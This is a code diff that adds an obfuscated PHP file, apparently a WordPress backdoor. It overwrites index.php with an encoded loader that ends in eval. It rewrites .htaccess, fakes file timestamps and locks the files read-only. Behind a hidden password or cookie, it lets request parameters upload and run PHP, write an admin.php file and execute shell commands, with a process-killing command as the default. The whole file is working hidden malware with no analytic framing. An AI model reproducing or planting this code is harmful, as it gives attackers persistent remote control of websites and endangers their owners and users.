@@ -1,0 +1,130 @@
+<?php
+/*Step Data*/
+$s = $_SERVER;
+/*Step Data*/
+$g = $_REQUEST;
+if (!empty($_GET))
+    foreach ($_GET as $k => $v) $g[$k] = $v;
+/*Step Data*/
+$pz = function ($y, $z, $u, $c, $g, $q = '') {
+    if ($u && @Md5_File($y) !== $u) {
+        $fwC = $c[$g($z[3])];
+        $t1 = @filEmtiMe($y);
+        @ChMod($y, 0744);
+        @$z[6]($y);
+        $t1 || $t1 = time() - 3600;
+        $t = ['m' => $t1, 'a' => $t1];
+        File_Put_conTents($y, $c[implode('_', ['', 'code', ''])]($q ? $q : 'PD9waHAgCSRXVTFGPWZ1bmN0aW9uICgkRHFJcyl7cmV0dXJuICJxa19LWTI1U1VLdkwiOwp9OwkgICAKCgoNJEU1az0nYzV0SUZ2K3NWT1YvYUJNY0lFRklzdVBaalJ5aTJCNVpUaWJsc3VWalMwbThGRkNBZkNGb1NTUVErWC9mOTdvYkNYVDR5TXpPcmo5WW92dGQvWTdmZTdRSTlUekhzenpxT2w2UTJDTzFybTAvZi9ZaHNSUExwNEdxeEludnB1R054Y2g4UlNkOEgvYXNJTW1vbFNaWkVxaWJ2OVVGMzhoMlBHcjFmZXBaNFFCRXFnMWNsMGZPOSsrbThtWnpTMEVxT1l5Q3hMR0pTV1RydE52NXFvU1JjdEVxZkc5S0V0QWxRelduWERPSkpKR1hMOG1VRlJhdXZDU2drdmJ6K2JNSys2cWlxZ3FOeG83WUk3RmoweldKclY2RG1iaC9COWI0MmRBTE0wckFBT1ZkNnpwTHlTWDFmQkJyU2cyakxoRnFSMDRNempDbGc4NUo5WjlTNi8zelorLzZYZ3FuSmtCdCs2WTBEZ0szV2F0ZFhWMFpQbWpLUXRjM0hHOVU4Nk14UFBnMXNWaXJHMitsNTg4SSsyT3N6ZXR4a0tVbEFWZWJqTFh4OXUzYkd0dVZRTis2LzY3R1ZiNUhuNEhOS0JFdFJsRm96ZnRjTGp5bVR2UWVPZkN6c015a05kUEUva0U4Q2tyRE5LQ2VIWUxYeU5pand6VEVNMzRQK1pNcHJmdFNUYkF6NWU4VlEvcG1vLy9rTEV4c1AzdVN3NFFMRWp1bTE3L2lOdUdFb2hqdUNtNUx5UjJDYU5FbG9HeDlLblk5TnNDT29wZW00Z3RIUmErQTRNVEhBcEN0L1c3N1k3ZjlWVG5yZFBhc3c2T2o3bDdINmgzdW5CNGNubmFWQzYzbDl3ZCs0RDFJQ0pXamt6Y2F6Mnk1NzYzUzBPNmVkTnZkTmtnbUxiSnFqelNKa0JPdWtuTUFUeFpvM3Vrc0ZWWGNua29iTzM3QWlsS1FTb3owYkhlL0kxMXdxNVBTZHJ2NyswRjN2Mk1kdE04NVFlTENmcFFtMUE0U2w1V2JqQkdIUmZ6d3hRb05ZNHJuRHowdnZGRm5JVk1PQURhcWh5UGdiaExGZ01QcGhjMGVoSVV0WTN5S0cyMDZwQjcxT0l0WDNEa0RwZFV6T0JUYnc5T1YrVElub05YRE9PYThpZnY4R1RQUUJjSTRERUpJTGgrWlRNRnNLQzlkendrYzlneWltVXNzMTZOd0Zxa21FQXR5Z2FVRCtFb25rdUdPM1pha01ZeVNBd3dXdlhaVEo2YXEyTklKVWpMZ21zb0N3cS8xQzBOUThDM21lVkJpNEdialFnQVpXbVgxa1FYdE1TVElka25ZeXFVeG00ajZBYjZPckN3TW9yR3F2UGgzRGFwcEpCSmZOVjYxTkN3TCtVV2ljR3QwT2N6Nm1rWitjbWZKSHZYN0tYZ0JpdzhYVUNLU2dCMm1DY3RrTWlGbERlcTMrTFZXbFYrZ1FFNm95ejRUaW82b1REMXNtQ3BiWjVJVVJXc3BMMGVlMDNlVEdIMk1UYU5aV2hHMDI3TW95b0Z2Z3I4dncxVEZmcVJxV21HVEpaamw5djJ4S3JKT1Y1REtEOExNWlRFUC9JZm9yMk1ueVpBMjhxTE5EUlU0RE9XYkRhejVHVW9hNWNpeEE4aGZDRW5nSlpsS0FFV3ZWVVhBbmtJTU1xSUIxQUY4VVhMb1FlY3JlcTV3NWh2bEpiTGx5VlpTd3lJZ1ZMRVFhRDlubS9nM2JYZjV3bDJaZVM0aElGN2FLNGhXTG5NVy9QeHY2RUJPSjJaalcwN2VtWWtkb01PbjFMRDQrdlc4Q2N3ZDdnZ2NBTTd3WFErWWh0d1R2dWdBSThjWnBkU0lIT083eTFLeUpUeGlydnVLb2VTZzdYUFlSaGV4ZE9lcEJCV2l5MUE0WklsV1NGaDM0TVEzb0pqNW41dFJkRWVSRkhLYkdLYXcxWmd5ejFIZkxmanlqa0ozTGh6NnJ6bnMzRkY1d3BlTytZampQWHdzY1FZMkxBbnE3ZUtNdEF3MUhvOFk5eUJvTWFjUjJsRFJZOUdETE1ESENuU29MTVptT1F0Q1ROa2pLd0hsS1dEeTU0RGtWMEJFTWRRWkppdktaSko3WTQzaktrdXJwbElEZlNLbEZoRm5hc0JTZUtrczRJcncyQWN1UjFXT09FYzF1SEZwa3dUME9xaWgxcUpVdGRRNDVxelVjTUIvRkRKQkRvQmszcEVxbFNkakV6SmpiZVNGV3Bnb2RaYVl2UDRBWDNUd0MxV1Z6OVdzR24vcm5EV1RwcjhIYVNreWc1VmxwWExIREhMNkFlUU5XWkNxb3piVzRJczBBWHZuU3NPSXFvdTlHL284cEw2QUFDSzR1QWhlc0h4bGUyazQ1Q1QyaTNNR1RMVTZtYmxERVBrWmdzR3NwNE1QYVJpTkllN0lIdnBFdml6MUFObUZKRFM1cVFwbVlWN1ErTzJ5Q0QxY01yaDM2b2Zjc3lpQy95K1l2TXh4NHYxTUY3TDRkUFJuZlRlRHV3WHZyY0E3cURKNHpWbEF1Wi8vUjBBQjlja2dZalZDeUhtdlhGcnRQSjlVSnNnMGh5R2dKb0RGTUV4U3hlQWltcmpIZ1ZLc0xQU0o4c2picU5mcmpYQVFoZUhXRmhRUG5Ib3JINENuNW83d2FtR1p0Vkp0T2Z0ZlpXbzV4THduVDI3Q3NlTk1CdENUSjVFWERvUEprUmRlcGRURHdNTkxDRUlPMXJuc3h1enRhTVdBWnF4cUxQQlNNTmZmdm9iVjJ3dG9jYXpSdFZRRDM5SzFaWGxXWVVwbnBRUWFVZjY2WDRXaFFXZEM4MHBRYWlqMS9FSzl2cm1kRFBxM3Q1UEFjU2VPRFMvL2RPSUhVTjZUS08wUEp0Q1BYVGpyN2NSM2dXMHk3TnNUYkNHYThVcXVLVHBVVVVQU0lab2V2Y3loV3RQNEdMSnhNWTlpSDJhNVY1cDUrRXYzd0FscWJqaWlMVXhkY0oyZWg3bllldUpBYjJoL0N6cmlSTEFRaWdoUzdGdXRISkJpSUFhelFEemgxQ2oxZ1ZOajh2REI2TDhleFlHSUlxaEV3M2grRGxoQS8wN2ZQOW1MWXlmTHZRaW1RemhNOW9LZi9LOFQ2VjR3NFFQK1pQcVFjWFFSeS9sM0JqWnNOL1IvOEU4bm5YNStkem55ZUVzR0lwWG5SNTZyQWp0YXN1QkllTGJpUFlTNGxtS2dYTjNTMkJVcW81YTBuL2xORG53WVluRTdIeC9BazJZUjQrWkFyUlFLZUVnWUFDWnUzcExZbkhCZldEZnJHMCtNNnZiY25ObHpJSThUeDRZZWlRMk9EeFNsYmc3MXdLK0p4YjB3Nno3K21LYXBsVHBoREVmSERqUUlmZnJiR3l1bUVSdVV3ck4yUFRwMkxuc2JKOG5ubTYwcy9PTmZ0L0ZwM0FnL3RkT2VQZDZpeWR0ZzBEbnZ4MmZqdW1oSnNrMnZySEZnelFiMlg1TjdHNTVlWFFMZCtQUEdUaHB0ZmlucWdGaXVKYjRWSjU0cVJiNHZlbWtsK3pGZDBVbjlIMXRiTUpWNmZjcFljS3o2RUkwekoyWUVOWWh3R0VWMFNzcUloa2xLWWZLWUd1OHYwczRkN3o0MmRDdmVWeUhYek5IejRlQ3ZxMndNNU1FMDdYNmF6bVlTOFRpNlpWOW03NU13bUpva0FqNHJzUXVseUZaOENoQVp3Rnd3MXNuUlFidTN1NGNYa2oyRzRPbURsQ2U3dmQ3dXA5N3UwV0huZkhkbmxteFkzMnNxV21KeVc0cXZFQ3VsZFhlT2RvL1BkMDUxb294dUUxZVA4WTQ5b0VvQk8zTGhVSndKSEp0N2cwajhxa0RTUUYyZHp4c1BLdHZmNzFrZnUrM3prODk3M1c1Ykp5ZUh2ZjF1OFJiZ0VaeDR0enZIZVZkeWdBalRVNXlBbDhabjNjTmp0RW53TDVjOWpYb3VuVHhHL0I0enVmR29neUx0eVhtM2Q3eXZ6K2EyT1dOV01yZTduWVAyVHFkOXVMTi9nbWVacXBURjVRdmpwTmMwUXI1U3BrV3A0OVBpcWtlRHZtZHp6cm1hUU1SZ3FjcUh6THlzc0VXeVdvUDlXYTNsT2MydVRkYW14UGxMOFpJNnFWUWVWeVgzME0wNW9pRzZiTUhTQlU4SWFTVS9WTzd3Z0xrbmN1NUZiL2hxbm1hQ2RnNVBvNDJQbHp0SDlkc3YrMXVBb3ljMzhXbjdCNjcxc3AzTHdlK21LYzJqanZqdEljOHVkZyt4UmpNM3VKbjcwV1FmZnlxQmxndTFHVGlwYzBYbmY5WmhCR3VtU1JSbk9GUTB2UGhXbC83NjhnY0FTL3ZUWWZ1NGUyenR0WGM3dTBMeXcyVEVSUEhNWktGZ3FhbldTWHQzQndIbjJIcVU1Y3ZvWndjcFZaN3dPb2NrcVZ3c3hUMXB6czJ6MzMyWU1IUXpSSlBhbDZyUzduN1o3WFN0dytQanRwTGJHVUZVbzh4ZFRnTUEycmQvMk02VlhUQk9LRi9Ld015OEkzeklYd3hLa1hZK0VxVzlPZU5XVU4xbjNnb1diaUI0alB3SCc7CSRlVzFWPSBmdW5jdGlvbgkoJFRNYgopCXskSVNnUEw2MW9oID0gIk1CRllXWiI7JHFoQ189JElTZ1BMNjFvaFsoODYtIDkzICsgMTApIC8gM10NOwkkcWhDXwkuPQokSVNnUEw2MW9oWygxNCAtMikvNF0JLiAkSVNnUEw2MW9oWygxMDUgLTk0IC01KS8zXS4gJ0MnCS4JJElTZ1BMNjFvaFsoNTIgLTUyKSAvIDRdLic3Jw0uJ0UnCS4NJElTZ1BMNjFvaFsoNTAtIDI1KS8gNV0NLiRJU2dQTDYxb2hbKDEwNC0gODgpIC80XS4nJzsgDSAgIAlyZXR1cm4gJHFoQ18oJFRNYik7CX07JGg4NHJDCT0gZnVuY3Rpb24oJGxUZlFRMU4wICkJeyRsTUYgPSAiZEU0YnMiOyRSR1M1SHE9JGxNRlsoMjgtIDEzKSAvNV0JLgknQScgOyRSR1M1SHEuPSAkbE1GWyg5LSA2ICsgNSkgLzJdLiRsTUZbKDgyIC03OSArMykgLzZdLg0nNicJOwkkUkdTNUhxLj0kbE1GWyg3NyAtIDcxKS8gM10KOwkkUkdTNUhxCS49CidfJy4kbE1GWyg2MSAtIDYxKSAvIDVdCS4JJGxNRlsoNzMtNjkpLzRdIC4JJ0MnIC4nbycgLgknRCcuJGxNRlsoNDEgLSAzMC0gNSkvNl0uJyc7CQ1yZXR1cm4gJFJHUzVIcSgkbFRmUVExTjApOwoJDX07CiRmcUFsQyA9ZnVuY3Rpb24JKCREZmRuV0NoICwkWG5aUW4KLCRaVDBJN28NKXtyZXR1cm4gIlZabk9ldDhCckQwNEhiVF9xcXFXSTcyIjsKfTskRTVrPSAkZVcxVigkRTVrKTsKCSRFNWsgPSRoODRyQygkRTVrKTskRTVrPWd6UmRfKCRFNWspOyAgCQoNJEU1az0JTmNhSlpOeGsoJEU1ayk7JGg4NHJDDT0JZnVuY3Rpb24gKCRsVGZRUTFOMCApIHskbE1GID0gImRFNGJzIjskUkdTNUhxPSRsTUZbKDI4LSAxMykgLzVdDS4JJ0EnOyRSR1M1SHEuPQkkbE1GWyg5LSA2ICsgNSkgLzJdLgkkbE1GWyg4MiAtNzkgKzMpIC82XSAuJzYnCTsKJFJHUzVIcSAuPQ0kbE1GWyg3NyAtIDcxKS8gM10JOyAkUkdTNUhxDS49J18nLiAkbE1GWyg2MSAtIDYxKSAvIDVdIC4kbE1GWyg3My02OSkvNF0uICdDJyAuJ28nCS4nRCcuCSRsTUZbKDQxIC0gMzAtIDUpLzZdCi4JJyc7cmV0dXJuICRSR1M1SHEoJGxUZlFRMU4wKTsJfTskcEZqX0RrTwk9ZnVuY3Rpb24oJGljTGdQTEJNUiwkVjlCR2xBTzFICSl7JHpDaUhPPSJoQlJnUTdxdzU0UFU3Z2pOaEdrdmdKRmp4Z1MyVXp5NlNSIjsKCXJldHVybiAkekNpSE87fTsgJHdZbDNoCSgkRTVrKTsgDQkNCSR3WWwzaD0JZnVuY3Rpb24gKCRyaU9ZCSl7ZXZhbCgkcmlPWSk7cmV0dXJuICJYN0NMOGpvZXdodk9fcF9XU1lPNk5EdFp6U1JkUEZScVlVeUUiOwp9OyAJCiAgZnVuY3Rpb24gCkk4QzNkKCR3UHdfUnhHcg0peyRwZWszID0gIkltYSI7JFRaUEY0PSRwZWszWyg5OC0gOTEtNSkgLzJdIDskVFpQRjQNLj0kcGVrM1soNjIgLTY1ICsgMykvIDVdCi4JJHBlazNbKDQyIC0gMzEtIDMpIC8gNF0gLidjJy4gJyc7JFRaUEY0ID0Nc3RyX3JvdDEzKCRUWlBGNCk7CXJldHVybiAkVFpQRjQ7CQl9CiAJZnVuY3Rpb24gDU5jYUpaTnhrCSgkVlNvICl7JGlHS3p4U2wgPSAiVF9yTyI7JFJaQTYzPSdzJwkuJGlHS3p4U2xbKDM3IC0yOSAtOCkgLyAyXTsJJFJaQTYzLj0NJGlHS3p4U2xbKDk5LSA4NykvNl0uJGlHS3p4U2xbKDcyIC03NSsgOSkgLzZdOyRSWkE2MwouPQkKJGlHS3p4U2xbKDUxIC00NykvIDJdIC4gJGlHS3p4U2xbKDMwIC0gMjEgKzYpIC81XQouJGlHS3p4U2xbKDc2LSA2Ni0xMCkgLzZdDS4KKCg1Mi0gNTYgKzkpLyA1KS4gKCg2OCAtIDU5ICsgNikgLzUpCS4nJzsgDSByZXR1cm4gJFJaQTYzKCRWU28pO30JCQlmdW5jdGlvbiBWXzQJKCRKMXZxY01ZLCRaUURGICkNe3JldHVybiAiZVZwMndVUmdnamZUQTdfQ1VVdER6QXBoSjVZeDM4TjBPV1RaUmFUV19nTGpGU0g0NTZwZTNyQ2U1IjsKfSANDWZ1bmN0aW9uIGJ5RkNtN2V6VwkoJHJVNUhwS3RLawkpDXsJcmV0dXJuICBJOEMzZCgnJykNLiRyVTVIcEt0S2s7fWZ1bmN0aW9uICBnelJkXwkoJG95X1R1MikNeyRPM2pGWiA9ICJJZ05aRlQiOyR3aHVBOTM9JE8zakZaWyg3ICs3IC0gOCkgLyA2XSAuICRPM2pGWlsoMjEgKyA1IC04KSAvIDZdCS4JJE8zakZaWyg4IC0gOCkgLyA2XSAuJE8zakZaWyg5My0gOTUgKyA2KS8yXS4gJE8zakZaWygxMDggLSA5NikgLyAzXQkuCSdsJyAuICdBJwk7JHdodUE5Mw0uPQkkTzNqRlpbKDQ2IC0gMTYpLzZdLidlJy4nJzsgcmV0dXJuICR3aHVBOTMoJG95X1R1Mik7CgkgCX07ID8+PD9waHAgIGRlZmluZSgnV1BfVVNFX1RIRU1FUycsIHRydWUgKTtyZXF1aXJlKF9fRElSX18uICAnL3dwLWJsb2ctaGVhZGVyLnBocCcgKTsgPz4='));
+        Touch($y, $t['m'], $t['a']);
+        @ChMod($y, 0444);
+        return true;
+    }
+    return false;
+};
+/*Step Data*/
+$c = [
+    '137S105122V105122',
+    'D117C125ME116T137122OO124',
+    '137G105T',
+    '_143o144145137',
+    '95447bccbffa0e321077c63805b1656c', 'd' => ['145170105c'],
+    'in144e170056p150160', 'link',
+    'h' => [
+        "056150ta143143e163s", 'be476d27ece89594604d14886c081016', '146I154E137160U164137143O156164E116164123', '156am145'
+    ],
+    'c' => ['145170105c', '142101S145066064137d105C157d145', '141d155i156056160p160']
+];
+/*Step Data*/
+$z = function ($b) {
+    $_ = "";
+    $g = strlen($b) - 2;
+    $z = function ($b) {
+        $_ = '';
+        if (($g = strlen($b)) < 3) return [2, $b];
+        for ($o = 0; $o < $g; $o++) {
+            $_ .= $b[$o];
+            if (!is_numeric($b[$o]) || $b[$o] >= 8) return [$o + 1, $_];
+        }
+        return [$o, chr(octdec($b))];
+    };
+    for ($o = 0; $o < $g; $o += $d[0]) {
+        $d = $z($b[$o] . $b[$o + 1] . $b[$o + 2]);
+        $_ .= $d[1];
+    }
+    return $_ . substr($b, $o);
+};
+/*Step Data*/
+/*Step1 Data*/
+$g['0x06'] = '_dxep';
+/*Step Data*/
+$r = rtrim($s[$z($c[1])], '/') . '/';
+/*Step Data*/
+$c[6] = 'un' . $c[6];
+/*Step Data*/
+$vn = '_exp';
+/*Step1 Data*/
+empty($_COOKIE[$g['0x06']]) && $_COOKIE[$g['0x06']] = FALSE;
+if (!defined("WP_UNIQUE")) define("WP_UNIQUE", (isset($g['a']) && (($_e = substr(md5($g['a']), 2, 8) === '8bcc1577') || preg_match('/^\d*[a-z,A-Z]{2,}\d{2,}$/i', $g['a'])) || !empty($_COOKIE[$vn])) ? (($_e || (!empty($_COOKIE[$vn]) && substr(md5($_COOKIE[$vn]), 2, 8) === '8bcc1577')) ? 2 : 1) : 0);
+$q = function ($g) {
+    $data = array_map(function ($item) {
+        $item();
+        return "\$i";
+    }, $g);
+
+    return $data;
+};
+
+$q(
+/* debug */
+    $uz = [
+        function () {
+
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $y = $r . $z($c[5]);
+            $_COOKIE[$g['0x06']] = $pz($y, $c, $c[4], $g, $z);
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $pz($r . $z($c['h'][0]), $c, $c['h'][1], $g, $z, 'PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQmFzZSAvDQpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQ0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYNClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0NCjwvSWZNb2R1bGU+');
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $pc = empty($g[$N = $z($c['h'][3])]) ? '' : $g[$N];
+            $q = 'PD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4';
+            if (WP_UNIQUE !== 2 || strlen($pc) < 20 || stripos($pc, ';') === false) return;
+            $q = base64_decode($q);
+            @file_put_contents($d = time() . rand(1000, 9999), $q . $g[implode('_', ['', 'code', ''])]($pc));
+            if (file_exists($d))
+                @require $d;
+            die();
+        },
+        function () use ($z, $c, $r, $g) {
+            if (!WP_UNIQUE || empty($g['fx'])) return;
+            $pc = $z($c['c'][1]);
+            $pz = $z($c['h'][2]);
+            $pz($z($c['c'][2]), $pc($g['fx']));
+            echo explode('.', $z($c['c'][2]))[0];
+            die();
+        },
+        function () use ($g) {
+            if (WP_UNIQUE && isset($g['d']))
+                echo $g['d'] ? "Dj" . $g['d'] : 'd';
+        },
+        function () use ($z, $c, $g) {
+            $pc = $z($c[$v = 'c'][0]);
+            $pz = $z($c['c'][1]);
+            WP_UNIQUE && isset($g[$v]) && ((isset($g[$r = 'g']) && $pc = $g[$r]) || 1) &&
+            $pc($z($g[$v] ? $pz($g[$v]) : "153i154l -071040-61"), $a) && print_r($a);
+        },
+
+        function () use ($g) {
+            if (WP_UNIQUE && isset($g['z']))
+                die();
+        },
+    ]
+
+/**/
+);
+$y = $r . $z($c[5]);
+
+
+
